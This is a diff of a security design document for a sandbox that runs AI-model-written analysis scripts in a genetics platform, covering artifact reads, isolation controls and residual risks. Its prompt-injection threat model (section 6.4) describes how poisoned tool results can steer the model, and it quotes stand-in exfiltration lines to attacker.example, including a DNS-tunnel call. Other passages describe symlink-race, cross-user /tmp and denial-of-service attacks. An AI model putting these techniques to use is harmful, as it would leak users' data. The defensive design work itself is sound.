-before it is built, precisely so it cannot advertise a name that is already gone, and the
-deletions are folded into `artifacts_omitted`. **That field is a combined floor, not a trim
-counter.** It is `omitted + trimmed + purged`: `build_manifest`'s own omissions (entries it
-could not `stat`, or that were not regular files with `st_nlink == 1`), plus the trim's
-deletion count, plus whatever the seal pass destroyed or could not seal (`4h6.88`),
-and the first half stops being a count of its own past the scan limit — beyond that the
-directory is no longer enumerated and the supervisor logs that `artifacts_omitted` is a floor.
-A client can read it as "at least this many names are missing", never as "the trim deleted
-exactly this many". Nothing here is a budget violation — the
-retained tree ends up under the quota either way — so it is a behaviour to describe, not a bug
-to fix.
-
-**Name collisions across executions in one `(sub, sid)`: most recent wins.** Two executions in
-the same session can both write `manhattan.png`, and the resolution rule above ("executions
-belonging to this `(sub, sid)`") is ambiguous without a tiebreak. The rule: `read_artifact`
-resolves a name to the artifact from the **most recently completed execution under that key
-that produced it and is still within its 5-minute retention window**. Rationale — the model
-asks for an artifact it has just been told about, and the freshest is what it means; a
-stale-first rule would silently return a previous turn's plot for the same name, which is a
-wrong-answer failure rather than a loud one. Older same-name artifacts remain on disk until
-their own reaper deadline but are not addressable. If a future version needs to reach them,
-that is a new argument on the tool, not a change to this default.
-
-**Path allow-list — do not reuse `SUBAGENT_ALLOWED_PATHS`.** Section 1 keeps
-`_validate_path` because it is sound against `..` and symlink escape. It is sound *given a
-correct allow-list*, and the allow-list its existing caller reads is the trap:
-`SUBAGENT_ALLOWED_PATHS`, which `k8s/deployments/chat-backend.yaml:117` sets to `/data` —
-the chat-data PVC mount holding `chat_history.db` and `llm_config.db`, the exact assets
-section 1 calls the crown jewels. An implementer who wires `read_artifact` into chat-backend
-against the existing environment variable, because that is what the existing helper reads,
-hands the model a read primitive over **every conversation in the deployment**. Therefore:
-
-- `read_artifact` **never reads the local filesystem in chat-backend.** It proxies over HTTP
-  to the sandbox pod, on the same chat-backend-only ingress path as `run_analysis`.
-- The `_validate_path` call happens **inside the sandbox pod**, with the allow-list
-  `/scratch/<id>/artifacts` for the single resolved execution — not `/scratch`, not
-  `/scratch/<id>`, and under no circumstances `SUBAGENT_ALLOWED_PATHS`.
-- chat-backend's `SUBAGENT_ALLOWED_PATHS` is untouched by this work and gains no new reader.
-  `ENABLE_SCRIPT_EXECUTION` stays `false` (section 1), which is what makes that variable
-  inert today; `read_artifact` must not be the thing that makes it live again.
-
-### As built (`4h6.15`, `4h6.52`, `dh3`) — the read proxies over HTTP, the checks run in the sandbox, and the name is resolved against the `(sub, sid)` pair
-
-Everything specified above this subsection is now implemented. `4h6.15` built the tool with a
-descriptor-based read of chat-backend's **own** filesystem, a deliberate deviation recorded
-here because there was no sandbox HTTP service to proxy to; `4h6.52` replaced that with the
-proxy this section always specified. What exists now:
-
-- `ToolExecutor.read_artifact`, `ToolExecutor._artifact_error`, `_ArtifactManifests` and the
-  module constants `ARTIFACT_READ_MAX_BYTES` / `ARTIFACT_RETENTION_S` in
-  `genetics-mcp-server/src/genetics_mcp_server/tools/executor.py`;
-- `SandboxClient.get_artifact` and `ArtifactResult` in the same repo's `sandbox_client.py`;
-- `read_artifact_bytes`, `_artifact_digest` and `Supervisor.read_artifact` in
-  `sandbox/supervisor.py`, behind `GET /artifact` (section 2).
-
-`ToolExecutor._artifacts_dir`, `_open_artifacts_dir` and `_ARTIFACTS_DIR_PREFIX` **no longer
-exist**. Nothing in chat-backend opens a local path for an artifact, so the prefix that made
-`SANDBOX_ARTIFACTS_DIR=/data` unreachable has nothing left to guard: the variable has no
-reader in that process at all, which is strictly stronger than a guarded one.
-`SUBAGENT_ALLOWED_PATHS` gained no reader at any point.
-
-**The checks did not go away; they moved to the pod where the hostile party is.** The
-descriptor discipline `4h6.15` arrived at — and the measurements that forced it — now
-describes `read_artifact_bytes`: the artifacts directory is opened once with
-`O_RDONLY | O_DIRECTORY | O_NOFOLLOW`, the artifact is opened as a bare name **relative to
-that fd** with `O_NOFOLLOW | O_NONBLOCK`, and `S_ISREG`, `st_nlink == 1` and the size all come
-off that one descriptor. Two checks exist there that the local reader never had, because they
-need state only the supervisor holds: the name must be in the digest map the manifest was
-built from, so a **planted** file is `404` before it is opened, and the returned bytes must
-still hash to what they hashed to then, so an **altered** one is `409` (`4h6.82`, `4h6.88`).
-
-**Why the lesson survives the move.** The first version of the local read validated a path and
-re-opened it, and a validator won that race 825 times in 6,000 calls. Opening once with
-`O_NOFOLLOW` was then found to be the *same* defect one level up — `O_NOFOLLOW` guards only
-the **final** component, and `artifacts` is an intermediate one the child owns, so relinking it
-at another execution's retained artifacts leaked out-of-tree content **151 times in 20,000
-iterations (0.76%)**. `_validate_path` was no help at all: it resolves both sides through the
-same swapped link, so they agree. The real defect was **addressing anything by path after
-checking it**, and fixing it at one level only relocated it to the next. Re-attacking the
-descriptor form gave **0 leaks in 40,000 iterations**. That is why the sandbox-side read has
-the shape it has, and it is the reason `_validate_path`'s answer is advisory wherever it runs.
-
-**`O_NONBLOCK` on the file open is a control, not tidiness, and `4h6.52` had to add it on the
-sandbox side.** `O_RDONLY` on a FIFO with no writer blocks **in the kernel**, before `S_ISREG`
-is ever reached. The local reader carried the flag from the start; the sandbox-side open did
-not, and its own comment said so — the digest map narrows the hazard (a *planted* fifo is not
-in the manifest, and `build_manifest` lists regular files only) but does not close it, because
-a same-uid peer can `unlink` a name the manifest **did** list and `mkfifo` it back during
-retention. Once the local reader was removed this became the only path that serves artifact
-bytes to a caller, so the property had to hold here or nowhere.
-
-**It is not, however, the only place the supervisor opens an artifact by name after stat'ing
-it, and the first round of `4h6.52` fixed the two that production does not reach.**
-`seal_retained_artifacts` lstats each entry, checks `S_ISREG` and `st_nlink == 1`, and then
-opens it by name relative to the directory fd in `seal_artifact` — the identical
-check-then-open window, on `_execute_inner`'s completion path, holding the execution slot with
-no timeout above it. That open now carries the flag too; a writerless fifo left in that window
-yields EOF on the first read, so what is renamed over the name is an empty sealed file rather
-than a wedged thread. `_artifact_digest` carries the flag for the mirror-image reason
-(`build_manifest` stats an entry, finds a regular file, and the replacement can land before
-the digest's own open) — but note that `build_manifest`'s only production caller always passes
-a `sealed` map, so that branch, and with it `_artifact_digest`, is reached today only by tests.
-`scripts/test-supervisor.py::test_artifact_fifo_does_not_block` drives all three on a thread
-with a deadline, because the failure under test is a hang.
-
-**Cross-execution scoping is implemented, in chat-backend, and it is the authorization.**
-`run_analysis` records each completed execution's manifest against the **authenticated**
-`session_id` in `_ArtifactManifests`; `llm_service._execute_tool` injects that session into
-`read_artifact` exactly as it injects the identity into `run_analysis`, stripping any
-same-named key the model emitted first. The declared schema still has one parameter, `name`.
-A name recorded under another session resolves to nothing and returns the **same** answer as a
-name that never existed — not merely refused, invisible. Collisions within one `sid` resolve
-most-recent-first, as specified above. The map is recorded for a failed execution too when the
-supervisor still reported a manifest: a script that raised after writing its plot produced a
-real, retained artifact.
-
-**The map is in memory, bounded, and expires with the artifacts — deliberately not
-persisted.** `RETENTION_S` is 300 s and the per-execution encryption key lives only in the
-supervisor's process memory, so a row that outlives either the retention window or the sandbox
-process points at bytes nobody can serve. A persisted map would buy only a longer window in
-which the tool promises a read that ends in `404` or `409`; expiring with the artifacts keeps
-the two sides failing together. Bounds: 512 sessions (LRU by last write) × 128 executions
-each. **They are memory bounds, not headroom over the window**, and the earlier claim that both
-were "far above what a 5-minute window can hold" was wrong: it assumed an execution takes tens
-of seconds, whereas a trivial script returns in well under a second, so ~600 executions fit in
-one 300 s window. 128 is sized off measurement instead — benchmark turns reach 58 tool calls,
-so it leaves better than 2× headroom over anything observed — and the consequence past it is
-chosen and benign: the oldest row is evicted while its artifacts may still be on disk, and a
-read of one of those names gets the non-retryable `ArtifactNotFound` whose wording already says
-to re-run the script. chat-backend is `replicas: 1`, and for this map that is load-bearing in
-its own right — a second replica resolves nothing for a read routed to it — the same premise
-db-api's per-execution byte counter and results-api's sandbox budget already run on
-(`k8s/deployments/chat-backend.yaml` carries the comment).
-
-**The two readers are one reader.** `_fetch_analysis_images` (automatic, image-only, at most
-four) and `read_artifact` (by name, scoped to the requesting `(sub, sid)`) both go through
-`SandboxClient.get_artifact`. Before `4h6.52` they disagreed: 4 MiB against 512 KiB, and text
-truncation on the local path only. Two user-visible decisions were taken rather than inherited:
-
-- **The byte cap is now 512 KiB, a reduction from 4 MiB.** The supervisor answers `413` above
-  `ARTIFACT_READ_MAX_BYTES`, so any larger number here would only promise bytes the sandbox
-  refuses. `413` is surfaced as its own non-retryable error telling the model to have the
-  script write a smaller summary.
-- **The 100k-character text truncation survives.** It bounds the **model's context**, which no
-  transport cap does — 512 KiB of TSV is well over 100k tokens in one tool result — and it is
-  the one of the two a caller can act on, because `truncated: true` says what happened.
-
-**Error mapping, because two of these statuses reach this tool for the first time.**
-`409 ArtifactModified` is reported as itself, non-retryable, with the only repair that works:
-re-run the analysis, do not re-read, and tell the user the earlier output could not be trusted.
-Letting it surface as a generic failure would invite exactly the retry that cannot succeed.
-`404` and a name this session never produced share one wording. A transport failure or a `500`
-is `ArtifactUnavailable` and **is** retryable — a server-side fault is not a bad name. A `400`
-(the supervisor rejecting an `execution_id` chat-backend itself resolved) is our bug, and gets
-the not-found wording rather than a description of our internals.
-
-**Two failures that look server-side are deterministic and are therefore NOT retryable.** A
-`200` whose body the client cannot parse (`SandboxProtocol`) returns the same body to the same
-`execution_id` and name, and an `execution_id` the client's own pre-flight refuses
-(`SandboxBadExecutionId`) issues no request at all — re-asking re-rejects the identical id. Both
-used to fall through to the retryable `ArtifactUnavailable`, and nothing above this tool bounds
-the retries the way `run_analysis`'s 300 s `wait_for` does, so `retryable` here has to mean "a
-second ask could plausibly succeed" rather than "the fault was not the model's".
-
-**The sandbox-side read needs no `/proc`, and this is worth stating because the local
-reader's `/proc/self/fd` verification did not survive the move and an operator debugging a
-read failure should not go looking for it.** That step existed because chat-backend was handed
-a *path* it had to prove it had opened; the supervisor is not — it constructs
-`/scratch/<execution-id>/artifacts` itself from an id it validated, opens it `O_NOFOLLOW`, and
-opens the file relative to that descriptor. There is nothing to re-verify, and
-`read_artifact_bytes` never consults `/proc`. A masked or restricted `/proc` in the sandbox pod
-does not disable artifact reads.
-
-`read_artifact`'s exclusion from the MCP tool set landed with `4h6.15`; see section 5, layer 1.
-It is also excluded from every subagent skill by name, so no dispatcher reaches it without a
-session.
-
-### 6.3 Resource exhaustion starving chat-backend
-
-**The control is physical separation, and it is the second reason for the dedicated node
-pool.** The sandbox is the only pod tolerating `sandbox.gke.io/runtime=gvisor:NoSchedule`,
-and chat-backend cannot schedule there. A script cannot contend for chat-backend's CPU,
-memory, page cache or pids, because it is not on the same machine.
-
-This also protects the constraint `docs/project-spec.md` documents at length. The figures
-this paragraph used to quote (a pinned 2 × `e2-standard-4` pool overshooting one node at
-3951m / 13.60 GiB) were **wrong on both the pinning and the arithmetic** — see
-`genetics-results-suite-262`. Re-derived: the primary pool autoscales 1-3, and a full deploy
-peaks at 3226m / 12498 Mi (finngen) or 3826m / 13778 Mi (daly, as deployed by default) against
-3920m / 13273 Mi allocatable — so daly is over by 505 Mi and already needs a second node on
-memory (daly with `ENABLE_RAG=true` is over on both axes at 4076m / 14290 Mi), while finngen
-fits with 775 Mi of margin.
-The sandbox adds nothing to that budget either way, which is why `4h6.10` adds a pool rather
-than re-sizing the primary one.
-
-Secondary controls, in case the sandbox is ever moved onto the shared pool: `requests`
-equal to steady-state need, `limits` bounded well under one node, replicas 1.
-
-### 6.4 Prompt-injected scripts
-
-**This is the primary threat, not an afterthought.** Tool results and user-supplied file
-attachments flow into the model's context. Sources that a third party can influence
-include: myvariant.info and cBioPortal responses, MouseMine/MGI and UniProt payloads,
-Europe PMC abstracts, Perplexity and Tavily results, proxied gnomAD and Open Targets MCP
-tools, and any TSV or text file a user uploads. Any of these can carry a string that reads
-as an instruction. The model has no reliable way to distinguish data from instruction, and
-**this design does not assume it can.**
-
-The controls, all of which work regardless of what the model was persuaded to write:
-
-1. **No capability is granted by trust.** An injected script runs in exactly the boundary a
-   benign script runs in — same uid, same read-only rootfs, same egress allow-list, same
-   token. There is no privileged path to escalate into, because there is no privileged
-   path at all.
-2. **The classic payload has nowhere to go — because there is no DNS either.** "Query
-   everything and POST it to `https://attacker.example`" fails at the NetworkPolicy; the
-   only reachable hosts are db-api and results-api. This control was overstated in an
-   earlier draft, which allowed kube-dns: the payload does not need a POST or a response,
-   only `socket.getaddrinfo(b32(chunk) + '.exfil.attacker.example')`, and CoreDNS forwards
-   it upstream at roughly 200 KB/s of usable payload. The claim holds *only* under the
-   no-DNS/`hostAliases` decision in section 3. If DNS is ever restored, this control is
-   false as written.
-3. **There is no credential worth stealing.** No `INTERNAL_API_SECRET`, no GCP token, no
-   KSA token. The one credential present is a 5-minute, audience-bound JWT that is useless
-   outside the pod's own network position.
-4. **No cross-conversation persistence — which is why there is no shared writable path.**
-   `chat-data` is not mounted, so an injected script cannot read other users'
-   `chat_history.db` and — the sharper risk — cannot write `llm_config.db`, which holds
-   user-authored prompt text that is fed back into system prompts.
-
-   This control is the reason the pod-level `/tmp` `emptyDir` from an earlier draft was
-   removed (section 2, Volumes). An `emptyDir` lives for the **pod's** lifetime, not the
-   execution's, and `replicas: 1` plus `concurrency: 1` does not reduce the exposure — it
-   *guarantees* that successive users share the same pod. The attack it enabled: user A's
-   turn ingests a poisoned upstream source, the script writes `/tmp/.cache`; `/scratch/<A>`
-   is deleted at completion but `/tmp` is not; user B's turn, minutes later, reads it back
-   and the injected instruction re-enters a second conversation. Concurrency 1 bounds
-   *concurrent* leakage; a shared filesystem is a **sequential** channel and concurrency 1
-   does nothing about it. Every writable path is now per-execution, `TMPDIR`/`HOME`/
-   `MPLCONFIGDIR`/`XDG_CACHE_HOME`/`PYTHONPYCACHEPREFIX` all point inside
-   `/scratch/<id>`, **`/tmp` is not writable at all** — and *if and only if* the `/tmp`
-   volume is ever re-added as the recorded degradation section 2 describes, the supervisor
-   wipes it completely before every fork. There is nothing to wipe in the shipping design;
-   the wipe is the obligation attached to the degradation, not a standing control. And
-   `/scratch/<id>/artifacts` survives completion only for 5 minutes and, through
-   `read_artifact`, only for the **user** whose gateway-asserted session originated it — the
-   `(sub, sid)` manifest key, not the session id alone (see the `read_artifact` subsection). `GET /artifact` does not
-   widen this: it is addressable only with the `execution_id` chat-backend minted, that id
-   is never shown to the model or to a script, and only chat-backend's automatic image fetch
-   for the run it just performed ever calls it — an injected script cannot ask for another
-   execution's artifacts because it cannot reach the route and cannot name a second id. With
-   that, there is no way for injected code to influence a later turn, a later conversation,
-   or another user.
-5. **Attachments are copy-in, not mount-in.** chat-backend may copy specific user-supplied
-   attachments into `/scratch/<id>/inputs` read-only for a given execution. It must never
-   mount the attachment directory or the PVC. A script sees the files it was given, not the
-   directory they came from.
-6. **It is visible, with the limits in 6.2's control 3.** Token delivery has landed on both
-   sides (`4h6.43`, `4h6.44`), so db-api's and results-api's `endpoint_access` lines carry
-   `sub`, `sid` and `jti` from the signed token and an injected script's *data access* is
-   reconstructable after the fact. The SDK's own call log is now collected too (`4h6.45`) and
-   its `[user=…] [session=…] [execution=…]` is stamped by the supervisor from the same claims,
-   so rewriting `SANDBOX_USER`/`SANDBOX_SESSION_ID`/`SANDBOX_EXECUTION_ID` no longer changes
-   what an operator reads. **An injected script is still exactly the case those records cannot
-   answer on their own**: it runs in the same process as the emitter, so it can write
-   well-formed records for calls it never made, drop its own by flooding (bounded, counted and
-   announced by the supervisor, but still lost), and read through `_executor` with no record at
-   all. Only the upstream `endpoint_access` lines, written outside the sandbox from claims the
-   script cannot sign, hold against it.
-7. **Explicitly NOT a control:** system-prompt instructions telling the model to ignore
-   injected content, or to refuse suspicious scripts. Those reduce frequency; they are not
-   a boundary and no control above depends on them.
-
-**What remains:** an injected script can still make the *user's own turn* wrong — burn their
-budget, return a fabricated analysis, or read data the user is entitled to and present it
-misleadingly. Sandboxing is a containment control, not an integrity control for the answer.
-See section 7.
+So attribution and framing are trustworthy: a child cannot name another user, cannot break the
+bracket framing, and cannot put text outside the admitted record shapes on an operator's
+stream. **The records are still not an account of what a script did.** A script can emit
+well-formed records for calls it never made, `client._executor.<method>()` reads data with no
+record at all, and a child can lose its own records by flooding its pipe (bounded and counted)
+or by suppressing them inside its own process, where nothing on the read end can see it happen
+— the summary a suppressing script produces is byte-identical to one that made no calls. **A
+zero-record summary means "this supervisor read no records".** Under an assumption of
+compromise, db-api's and results-api's own `endpoint_access` lines, written outside this pod,
+are what hold.
 
 ---
 
 ## 7. Residual risk
 
-Stated plainly. This design contains code execution; it does not make it safe in the
-abstract.
+Stated plainly. This design contains code execution; it does not make it safe in the abstract.
 
-1. **gVisor escape.** gVisor reduces the kernel attack surface; it does not remove it, and
-   it has had its own CVEs. A successful escape reaches the sandbox node — which is why
-   that node runs a dedicated, minimally-privileged service account with explicit
-   `oauth_scopes` rather than `genetics-suite` with `cloud-platform` (section 2). What an
-   escape yields is therefore node-local logging/monitoring/registry-pull identity plus
-   whatever the node's network position allows, not the suite's BigQuery and GCS roles. It
-   is still an escape, and the node remains part of the cluster.
-2. **DNS-tunnel exfiltration — eliminated, not accepted.** An earlier draft accepted this
-   as a low-bandwidth residual "at a few hundred bytes per query". That was wrong by three
-   orders of magnitude: ~10³ queries/s × ~200 usable bytes is ~200 KB/s, tens of megabytes
-   inside the wall clock, and enough to move a 1 KB GCP access token in five queries. It is
-   therefore not a residual at all in v1 — the sandbox has **no kube-dns egress** and
-   resolves its two service names from `hostAliases` (section 3). What remains as residual
-   is the operational cost of that choice: the `hostAliases` ClusterIPs are substituted at
-   deploy time, so a Service deleted and recreated out-of-band leaves the sandbox pointing
-   at a dead IP until it is re-rendered and rolled. That failure is loud (connection
-   errors) and is preferred to a working exfiltration channel.
-
-   **Why a stale IP cannot become a wrong destination** — the load-bearing half of this
-   residual. The concern is a recycled ClusterIP: the sandbox holds `10.x.y.z` for db-api,
-   the Service is recreated, and the kernel later hands that same IP to some other Service.
-   The egress policy makes that inert. It selects **pod selectors** (`app: db-api`,
-   `app: results-api`), not IP blocks, and Dataplane V2
-   (`datapath_provider = "ADVANCED_DATAPATH"` on this cluster) evaluates egress
-   **post-DNAT**, i.e. against the identity of the pod the connection actually lands on.
-   Traffic to a reused ClusterIP therefore resolves to a workload the policy does not
-   permit and is **dropped**, not delivered to the wrong service. The stale-IP failure mode
-   is a connection error in every case; it is never a silent misdelivery.
+1. **gVisor escape.** gVisor reduces the kernel attack surface; it does not remove it, and it
+   has had its own CVEs. An escape reaches the sandbox node — which is why that node runs a
+   dedicated, minimally-privileged service account rather than the suite's. What an escape
+   yields is node-local logging/monitoring/registry-pull identity plus whatever the node's
+   network position allows, not BigQuery and GCS. It is still an escape.
+2. **Stale `hostAliases` after an out-of-band Service recreation.** Loud (connection errors),
+   never a silent misdelivery — see section 3.
 3. **An authorized user can still extract data manually.** They could before, through the
-   browser and the existing tools. The sandbox is not sold as preventing this and does not.
-4. **Wrong answers.** Nothing here makes a model-authored analysis scientifically correct.
-   An injected or merely confused script can produce a plausible, wrong result inside every
-   control listed above. This is the risk the sandbox does *not* address at all, and it is
-   arguably the most likely one to actually occur.
-5. **db-api's shared-secret path is still fail-open, and this design *does* widen its
-   exposure.** An unset `INTERNAL_API_SECRET` still makes `require_auth` return early for
-   any request that is not a sandbox-shaped (HS256) bearer, with nothing but a startup
-   warning. An
-   earlier draft claimed this design "does not widen" that pre-existing issue. **That claim
-   was false and is withdrawn.** Today the fail-open is reachable only by chat-backend and
-   mcp-server, both of which run code the suite authored; this design adds a caller that
-   runs *attacker-authored* code and gives it a network path to db-api, and the fail-open is
-   reachable from it by the trivial expedient of sending **no `Authorization` header at
-   all** — which also sheds the `sid`/`sub`/`jti` attribution and, before the correction in
-   section 4, would have shed the byte and row caps too.
-
-   Two things narrow it. Section 4's caps are now **defaults for every request** rather
-   than sandbox-audience penalties, so presenting a weaker credential no longer buys looser
-   limits. And section 4 rule 6 makes db-api **refuse to start** whenever the sandbox is
-   deployed (`SANDBOX_ENABLED`) and either secret is unset.
-
-   **An earlier revision of this residual keyed that refusal on `SANDBOX_TOKEN_SIGNING_KEY`
-   being *set*, and then claimed "the configuration in which the sandbox can reach an
-   unauthenticated db-api does not boot". That claim was false for the both-unset case and
-   is withdrawn.** With the trigger on the signing key, a deployment carrying *neither*
-   `SANDBOX_TOKEN_SIGNING_KEY` nor `INTERNAL_API_SECRET` never fires the check: db-api boots
-   fail-open, and the sandbox — running alongside it — reaches it by sending no
-   `Authorization` header at all. Rule 6 as now written triggers on the sandbox being
-   deployed rather than on the key being present, which is what actually closes that shape;
-   rule 7 puts `SANDBOX_TOKEN_SIGNING_KEY` into `deploy.sh`'s secret-existence gate so the
-   pair cannot be deployed apart in the first place.
-
-   **What genuinely remains, stated without softening:** (i) a deployment with the sandbox
-   **not** deployed and `INTERNAL_API_SECRET` unset is still fail-open for chat-backend and
-   mcp-server traffic — pre-existing, not fixed here, and warranting its own issue; and
-   (ii) rule 6 is a *startup* check, so it constrains configuration, not runtime — a secret
-   removed from the cluster without a restart leaves a running db-api in whatever state it
-   booted with. Neither is introduced by this design; both are now stated rather than
-   claimed closed.
-6. **No PodDisruptionBudget for the sandbox.** Node auto-upgrade or repair kills an
-   in-flight script. The model sees an error and retries, costing a roundtrip. Acceptable.
-   (The namespace is no longer PDB-free — `k8s/disruption-budgets/budgets.yaml` covers
-   chat-backend and results-api at `maxUnavailable: 1` since `genetics-results-suite-262`.
-   Those are protectively inert at `replicas: 1` and cover neither the sandbox nor its pool.
-   A *blocking* budget on the sandbox would be actively harmful: its pool is pinned at one
-   node, so an unsatisfiable budget would stall every upgrade and repair of that node.)
-7. **The pre-warmed interpreter.** The supervisor process forks per execution to avoid
-   paying pod-schedule cost per script. The supervisor holds **no** credentials — tokens
-   are passed to the forked child only. The residual is that a bug in the fork boundary
-   (state leaking from a child back to the parent) would be a cross-execution channel.
-   Concurrency 1 bounds this to sequential executions rather than concurrent ones.
-8. **Timing and cost side channels.** A script can infer the existence of rows it cannot
-   read by timing queries or observing `maximum_bytes_billed` failures. Not mitigated; the
-   caller is an authorized user of those datasets anyway.
+   browser and the existing tools. The sandbox is not sold as preventing this.
+4. **Wrong answers.** Nothing here makes a model-authored analysis scientifically correct. An
+   injected or merely confused script can produce a plausible, wrong result inside every
+   control listed above. This is the risk the sandbox does not address at all, and it is
+   arguably the most likely one to occur.
+5. **db-api's shared-secret path is still fail-open, and this design widens its exposure.** An
+   unset `INTERNAL_API_SECRET` still makes `require_auth` return early for any request that is
+   not a sandbox-shaped bearer. Today that is reachable only by chat-backend and mcp-server,
+   both of which run code the suite authored; this design adds a caller that runs
+   *attacker-authored* code and gives it a network path, and the fail-open is reachable from it
+   by sending **no `Authorization` header at all**. Rules 4 and 6 in section 4 narrow it. What
+   genuinely remains: a deployment with the sandbox **not** deployed and the secret unset is
+   still fail-open for chat-backend and mcp-server traffic — pre-existing, not fixed here — and
+   rule 6 is a *startup* check, so it constrains configuration rather than runtime.
+6. **No PodDisruptionBudget for the sandbox.** Node auto-upgrade or repair kills an in-flight
+   script; the model sees an error and retries. A *blocking* budget would be actively harmful:
+   the pool is pinned at one node, so an unsatisfiable budget would stall every upgrade and
+   repair of it.
+7. **The intra-execution window.** Everything the fork server and the subreaper sweep bound is
+   *between* executions. A process forked by execution A is alive for the whole of A by
+   construction, and reparents only when A's child exits; anything it does to A's own directory
+   it does before the sweep runs. And the sweep itself is **unverified under gVisor**, which
+   implements `prctl` and `/proc` in the sentry; a subreaper that does not take degrades to the
+   old behaviour and says so in the log.
+8. **Duration is bounded, count is not.** The three read deadlines bound how long one
+   connection can hold a handler thread; nothing caps concurrent connections or threads. The
+   binding constraint is the pod task budget: roughly 16 silent connections per second, sending
+   zero bytes, pins the pod at `pod_pids_limit`, after which `fork()` fails and `/execute`
+   cannot run. Note the gradient — sending *zero* bytes is governed by the long idle bound and
+   is therefore ~6.5x cheaper per connection than sending one. And the response **write** is
+   unbounded: a client that sends a well-formed request and never reads the answer parks a
+   handler in `write` for as long as it likes. The drain deadline bounds what that costs at
+   shutdown; nothing bounds it during normal service.
+9. **Timing and cost side channels.** A script can infer the existence of rows it cannot read
+   by timing queries or observing `maximum_bytes_billed` failures. Not mitigated; the caller is
+   an authorized user of those datasets anyway.
 
 ---
 
-## Handoffs to other tasks
+## Verification: which harness proves what
 
-**Two closed beads are not evidence that any of this landed.** `genetics-results-suite-4h6.14`
-(`run_analysis`) was closed **as superseded** and split into the `4h6.38`–`4h6.52` chain; the
-rows and paragraphs above name the successor that owns each obligation, and a reference to
-`4h6.14` anywhere in this repo is stale rather than done. `genetics-results-suite-4h6.11` is
-closed and **did** ship the SDK — nothing else. Where it was cited as the owner of the
-`read_artifact` HTTP proxy or of the SQL-interpolation fix, that was never its scope; see
-`4h6.52` and the finding at the end of this section.
+| harness | proves | needs |
+|---|---|---|
+| `scripts/test-supervisor.py` | the wire contract, the queue, every supervisor limit watched *firing*, the artifact manifest and its integrity binding, encryption at rest, the fork server and its failure paths, cross-execution memory isolation, the bounded header read, the head deadlines, descriptor ownership, the shutdown gate, PID 1 orphan reaping | nothing: no cluster, no credentials, no image |
+| `scripts/test-supervisor.py --container URL` | the same wire checks against the real image, plus the read-only rootfs, the pruned venv, the seeded font cache and the absence of credentials in the child's environment | a container from `scripts/run-sandbox-local.sh` |
+| `scripts/test-network-policies.py` | the egress and ingress allow-lists, the three MCP-exclusion layers, the `SANDBOX_ENABLED` pairing, the label contract | the manifests; one live cluster call for the sandbox probe |
+| `scripts/test-sandbox-docs.py` | the shipped schema docs and stubs cover every view and the SDK's exported surface exactly, and no placeholder survives | a genetics-mcp-server checkout |
+| `scripts/gen-security-doc.py --check` | the generated tables in this document still match the code | nothing |
+| `scripts/test-e2e-local.py` | `run_analysis` end to end against the local stack, including what an execution leaves behind | the local stack |
+| `sandbox/build-checks.py` | the final image's properties, from the builder stage | the image build |
 
-| Task | What this document decided for it |
-|---|---|
-| `4h6.6` (image) | distroless `python3-debian12:nonroot`, uid 65532, no shell, build context `sandbox/` in **this** repo, wired into `build-all.sh`/`build.sh`. **Build-time assertion that `/etc/nsswitch.conf` exists and lists `files` before `dns` for the hosts database** — absent it, glibc defaults to `dns [!UNAVAIL=return] files` and every lookup stalls the full resolver timeout against a dropping egress policy before reaching `hostAliases`, and `readOnlyRootFilesystem: true` makes it unfixable at runtime. **No `google-auth`-based client in the image** (it probes `metadata.google.internal` by name, which is the same stall), or `GCE_METADATA_HOST` pinned to a literal IP if one is unavoidable. Second non-root uid for the child if pids option (a) is taken. |
-| `4h6.7` (manifests) | Full securityContext and resource table in section 2; **one** `emptyDir` (`/scratch`) and no PVC and **no pod-level `/tmp`**; KSA `sandbox` with no Workload Identity and `automountServiceAccountToken: false`; `hostAliases` for db-api and results-api instead of DNS, pinning **all four name forms** per IP (bare, `.genetics`, `.genetics.svc`, `.genetics.svc.cluster.local`) because the `files` NSS module does no search-domain expansion, with the SDK given the FQDN form; `oom_score_adj` on supervisor and child; a second non-root uid for the child if option (a) of the pids row is taken, with the shared-gid ownership contract in section 2; replicas 1; `runtimeClassName: gvisor` + toleration. `deploy.sh`: resolve the ClusterIPs **after** the Services are applied (resolving in the "derive variables" block deadlocks the first deploy to a fresh cluster), validate each as a dotted quad and abort otherwise (headless Services return the literal `None`), and add `DB_API_CLUSTER_IP`/`RESULTS_API_CLUSTER_IP` to the deployments `envsubst` allow-list or they ship unsubstituted. |
-| `4h6.8` (NetworkPolicy) | Egress allow-list of exactly **two** destinations (no kube-dns), ingress allow-list of exactly one, in section 3. **Also amend both `allow-ingress-db-api` and `allow-ingress-results-api` in `k8s/network-policies/policies.yaml` to add `app: sandbox` to their `from:` lists** — without it the primary data path is dropped at the receiving end. `allow-ingress-results-api` is no longer `from`-less (`genetics-results-suite-fad` scoped it), so the sandbox must be named there explicitly rather than inherited; never reintroduce a `from`-less rule in either. Do not add the sandbox to `monitor-policy.yaml`. Blocked on `genetics-results-suite-fad`. |
-| `4h6.9` (credential) | Token form, claims, lifetime, token delivery by POST body into the child only (never pod env), and the **seven** fail-closed validation requirements in section 4. Bearers are discriminated by **JOSE header `alg == "HS256"`, never by counting dots** — the dot test would 401 every Google Identity Token results-api serves. Rule 6 triggers on **`SANDBOX_ENABLED`**, not on the signing key being set, so the both-unset case is unbootable too; rule 7 adds `SANDBOX_TOKEN_SIGNING_KEY` to `deploy.sh`'s secret-existence gate. Caps (50 GB/query, 200 GB per `jti`, 25 000 rows) are **db-api only**, and there they are **defaults for all requests**, relaxed for a verified non-sandbox principal — which on db-api means the shared secret only. results-api enforces a **16 MiB response-byte cap and no row cap**: the row counter recognised only JSON while **TSV is the default `format` of every bulk range endpoint**, and parsing the buffered body to count was itself a memory amplifier, so `_count_rows`, `Caps.max_rows` and `SANDBOX_MAX_ROWS` were dropped there (section 4, "As shipped"). Its byte cap is likewise a default for all requests, relaxed for shared secret **or** Google id_token **or** per-user API token, because auth-gateway's `@api_bearer` location sends real users straight there with no shared secret. Row caps go in the **handler**: `max_rows`'s `le=MAX_ROWS` is a class-level Pydantic constraint and cannot vary per request. Separate results-api requirements: validator inserted **before** the shared-secret comparison, hard `401` on HS256 failure only, its own response caps. Blocked on `genetics-results-suite-fad`. |
